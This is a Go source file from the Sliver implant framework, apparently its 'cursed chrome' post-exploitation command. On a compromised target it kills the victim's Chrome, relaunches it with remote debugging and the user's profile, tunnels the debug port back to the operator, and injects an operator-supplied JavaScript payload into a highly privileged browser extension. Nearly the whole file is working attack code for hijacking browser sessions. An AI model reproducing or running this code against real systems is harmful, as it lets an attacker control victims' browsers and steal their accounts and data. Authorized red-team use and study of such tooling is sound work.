package cursed

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"errors"
	"fmt"
	"log"
	insecureRand "math/rand"
	"os"
	"strings"
	"time"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/overlord"
	"github.com/bishopfox/sliver/client/tcpproxy"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
)

var (
	ErrUserDataDirNotFound      = errors.New("could not find Chrome user data dir")
	ErrChromeExecutableNotFound = errors.New("could not find Chrome executable")
	ErrUnsupportedOS            = errors.New("unsupported OS")

	windowsDriveLetters = []string{"C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"}

	cursedChromePermissions    = []string{overlord.AllURLs, overlord.WebRequest, overlord.WebRequestBlocking}
	cursedChromePermissionsAlt = []string{overlord.AllHTTP, overlord.AllHTTPS, overlord.WebRequest, overlord.WebRequestBlocking}
)

// CursedChromeCmd - Execute a .NET assembly in-memory.
func CursedChromeCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	payloadPath, _ := cmd.Flags().GetString("payload")
	var payload []byte
	var err error
	if payloadPath != "" {
		payload, err = os.ReadFile(payloadPath)
		if err != nil {
			con.PrintErrorf("Could not read payload file: %s\n", err)
			return
		}
	}

	curse := avadaKedavraChrome(session, cmd, con, args)
	if curse == nil {
		return
	}
	if payloadPath == "" {
		con.PrintWarnf("No Cursed Chrome payload was specified, skipping payload injection.\n")
		return
	}

	con.PrintInfof("Searching for Chrome extension with all permissions ... ")
	chromeExt, err := overlord.FindExtensionWithPermissions(curse, cursedChromePermissions)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	// There is one alternative set of permissions that we can use if we don't find an extension
	// with all the proper permissions.
	if chromeExt == nil {
		chromeExt, err = overlord.FindExtensionWithPermissions(curse, cursedChromePermissionsAlt)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}
	if chromeExt != nil {
		con.Printf("success!\n")
		con.PrintInfof("Found viable Chrome extension %s%s%s (%s)\n", console.Bold, chromeExt.Title, console.Normal, chromeExt.ID)
		con.PrintInfof("Injecting payload ... ")
		cmd, _, _ := overlord.GetChromeContext(chromeExt.WebSocketDebuggerURL, curse)
		// extCtxTimeout, cancel := context.WithTimeout(cmd, 10*time.Second)
		// defer cancel()
		_, err = overlord.ExecuteJS(cmd, chromeExt.WebSocketDebuggerURL, chromeExt.ID, string(payload))
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
		con.Printf("success!\n")
	} else {
		con.Printf("failure!\n")
		con.PrintInfof("No viable Chrome extensions were found ☹️\n")
	}
}

func avadaKedavraChrome(session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient, cargs []string) *core.CursedProcess {
	chromeProcess, err := getChromeProcess(session, cmd, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	if chromeProcess != nil {
		con.PrintWarnf("Found running Chrome process: %d (ppid: %d)\n", chromeProcess.GetPid(), chromeProcess.GetPpid())
		con.PrintWarnf("Sliver will need to kill and restart the Chrome process in order to perform code injection.\n")
		con.PrintWarnf("Sliver will attempt to restore the user's session, however %sDATA LOSS MAY OCCUR!%s\n", console.Bold, console.Normal)
		con.Printf("\n")
		confirm := false
		err = survey.AskOne(&survey.Confirm{Message: "Kill and restore existing Chrome process?"}, &confirm)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return nil
		}
		if !confirm {
			con.PrintErrorf("User cancel\n")
			return nil
		}
		terminateResp, err := con.Rpc.Terminate(context.Background(), &sliverpb.TerminateReq{
			Request: con.ActiveTarget.Request(cmd),
			Pid:     chromeProcess.GetPid(),
		})
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return nil
		}
		if terminateResp.Response != nil && terminateResp.Response.Err != "" {
			con.PrintErrorf("could not terminate the existing process: %s\n", terminateResp.Response.Err)
			return nil
		}
	}
	curse, err := startCursedChromeProcess(false, session, cmd, con, cargs)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	return curse
}

func startCursedChromeProcess(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient, cargs []string) (*core.CursedProcess, error) {
	name := "Chrome"
	if isEdge {
		name = "Edge"
	}

	con.PrintInfof("Finding %s executable path ... ", name)
	chromeExePath, err := findChromeExecutablePath(isEdge, session, cmd, con)
	if err != nil {
		con.Printf("failure!\n")
		return nil, err
	}
	con.Printf("success!\n")
	con.PrintInfof("Finding %s user data directory ... ", name)
	chromeUserDataDir, err := findChromeUserDataDir(isEdge, session, cmd, con)
	if err != nil {
		con.Printf("failure!\n")
		return nil, err
	}
	con.Printf("success!\n")

	con.PrintInfof("Starting %s process ... ", name)
	debugPort := getRemoteDebuggerPort(cmd)
	args := []string{
		fmt.Sprintf("--remote-debugging-port=%d", debugPort),
	}
	if chromeUserDataDir != "" {
		args = append(args, fmt.Sprintf("--user-data-dir=%s", chromeUserDataDir))
	}
	if restore, _ := cmd.Flags().GetBool("restore"); restore {
		args = append(args, "--restore-last-session")
	}
	if keepalive, _ := cmd.Flags().GetBool("keep-alive"); keepalive {
		args = append(args, "--keep-alive-for-test")
	}
	if headless, _ := cmd.Flags().GetBool("headless"); headless {
		args = append(args, "--headless")
	}

	if len(cargs) > 0 {
		args = append(args, cargs...)
	}

	// Execute the Chrome process with the extra flags
	// TODO: PPID spoofing, etc.
	chromeExec, err := con.Rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    chromeExePath,
		Args:    args,
		Output:  false,
	})
	if err != nil {
		con.Printf("failure!\n")
		return nil, err
	}
	con.Printf("(pid: %d) success!\n", chromeExec.GetPid())

	con.PrintInfof("Waiting for %s process to initialize ... ", name)
	time.Sleep(2 * time.Second)

	bindPort := insecureRand.Intn(10000) + 40000
	bindAddr := fmt.Sprintf("127.0.0.1:%d", bindPort)

	remoteAddr := fmt.Sprintf("127.0.0.1:%d", debugPort)

	tcpProxy := &tcpproxy.Proxy{}
	channelProxy := &core.ChannelProxy{
		Rpc:             con.Rpc,
		Session:         session,
		RemoteAddr:      remoteAddr,
		BindAddr:        bindAddr,
		KeepAlivePeriod: 60 * time.Second,
		DialTimeout:     30 * time.Second,
	}
	tcpProxy.AddRoute(bindAddr, channelProxy)
	portFwd := core.Portfwds.Add(tcpProxy, channelProxy)

	curse := &core.CursedProcess{
		SessionID:         session.ID,
		PID:               chromeExec.GetPid(),
		PortFwd:           portFwd,
		BindTCPPort:       bindPort,
		Platform:          session.GetOS(),
		ExePath:           chromeExePath,
		ChromeUserDataDir: chromeUserDataDir,
	}
	core.CursedProcesses.Store(bindPort, curse)
	go func() {
		err := tcpProxy.Run()
		if err != nil {
			log.Printf("Proxy error %s", err)
		}
		core.CursedProcesses.Delete(bindPort)
	}()

	con.PrintInfof("Port forwarding %s -> %s\n", bindAddr, remoteAddr)

	return curse, nil
}

func findChromeUserDataDir(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient) (string, error) {
	userDataFlag, _ := cmd.Flags().GetString("user-data")
	if userDataFlag != "" {
		return userDataFlag, nil
	}

	switch session.GetOS() {

	case "windows":
		username := session.GetUsername()
		if strings.Contains(username, "\\") {
			username = strings.Split(username, "\\")[1]
		}
		for _, driveLetter := range windowsDriveLetters {
			userDataDir := fmt.Sprintf("%s:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data", driveLetter, username)
			if isEdge {
				userDataDir = fmt.Sprintf("%s:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data", driveLetter, username)
			}
			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
				Request: con.ActiveTarget.Request(cmd),
				Path:    userDataDir,
			})
			if err != nil {
				return "", err
			}
			if ls.GetExists() {
				return userDataDir, nil
			}
		}
		return "", ErrUserDataDirNotFound

	case "darwin":
		userDataDir := fmt.Sprintf("/Users/%s/Library/Application Support/Google/Chrome", session.Username)
		if isEdge {
			userDataDir = fmt.Sprintf("/Users/%s/Library/Application Support/Microsoft Edge", session.Username)
		}
		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
			Request: con.ActiveTarget.Request(cmd),
			Path:    userDataDir,
		})
		if err != nil {
			return "", err
		}
		if ls.GetExists() {
			return userDataDir, nil
		}
		return "", ErrUserDataDirNotFound

	default:
		return "", ErrUnsupportedOS
	}
}

func findChromeExecutablePath(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient) (string, error) {
	exeFlag, _ := cmd.Flags().GetString("exe")
	if exeFlag != "" {
		return exeFlag, nil
	}

	switch session.GetOS() {

	case "windows":
		chromeWindowsPaths := []string{
			"[DRIVE]:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
			"[DRIVE]:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
			"[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe",
			"[DRIVE]:\\Program Files (x86)\\Google\\Application\\chrome.exe",
		}
		if isEdge {
			chromeWindowsPaths = []string{
				"[DRIVE]:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
				"[DRIVE]:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
				"[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Microsoft\\Edge\\Application\\msedge.exe",
			}
		}
		username := session.GetUsername()
		if strings.Contains(username, "\\") {
			username = strings.Split(username, "\\")[1]
		}
		for _, driveLetter := range windowsDriveLetters {
			for _, chromePath := range chromeWindowsPaths {
				chromeExecutablePath := strings.ReplaceAll(chromePath, "[DRIVE]", driveLetter)
				chromeExecutablePath = strings.ReplaceAll(chromeExecutablePath, "[USERNAME]", username)
				ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
					Request: con.ActiveTarget.Request(cmd),
					Path:    chromeExecutablePath,
				})
				if err != nil {
					return "", err
				}
				if ls.GetExists() {
					return chromeExecutablePath, nil
				}
			}
		}
		return "", ErrChromeExecutableNotFound

	case "darwin":
		// AFAIK Chrome only installs to this path on macOS
		defaultChromePath := "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
		if isEdge {
			defaultChromePath = "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"
		}
		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
			Request: con.ActiveTarget.Request(cmd),
			Path:    defaultChromePath,
		})
		if err != nil {
			return "", err
		}
		if ls.GetExists() {
			return defaultChromePath, nil
		}
		return "", ErrChromeExecutableNotFound

	case "linux":
		chromeLinuxPaths := []string{
			"/usr/bin/google-chrome",
			"/usr/bin/chromium-browser",
			"/usr/local/bin/google-chrome",
			"/usr/local/bin/chromium-browser",
		}
		if isEdge {
			chromeLinuxPaths = []string{
				"/usr/bin/microsoft-edge",
				"/usr/local/bin/microsoft-edge",
			}
		}
		for _, chromePath := range chromeLinuxPaths {
			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
				Request: con.ActiveTarget.Request(cmd),
				Path:    chromePath,
			})
			if err != nil {
				return "", err
			}
			if ls.GetExists() {
				return chromePath, nil
			}
		}
		return "", ErrChromeExecutableNotFound

	default:
		return "", ErrUnsupportedOS
	}
}

func isChromeProcess(executable string) bool {
	chromeProcessNames := []string{
		"chrome",           // Linux
		"google-chrome",    // Linux
		"chromium-browser", // Linux
		"chrome.exe",       // Windows
		"Google Chrome",    // Darwin
	}
	for _, suffix := range chromeProcessNames {
		if strings.HasSuffix(executable, suffix) {
			return true
		}
	}
	return false
}

func getChromeProcess(session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient) (*commonpb.Process, error) {
	ps, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
		Request: con.ActiveTarget.Request(cmd),
	})
	if err != nil {
		return nil, err
	}
	for _, process := range ps.Processes {
		if process.GetOwner() != session.GetUsername() {
			continue
		}
		if isChromeProcess(process.GetExecutable()) {
			return process, nil
		}
	}
	return nil, nil
}
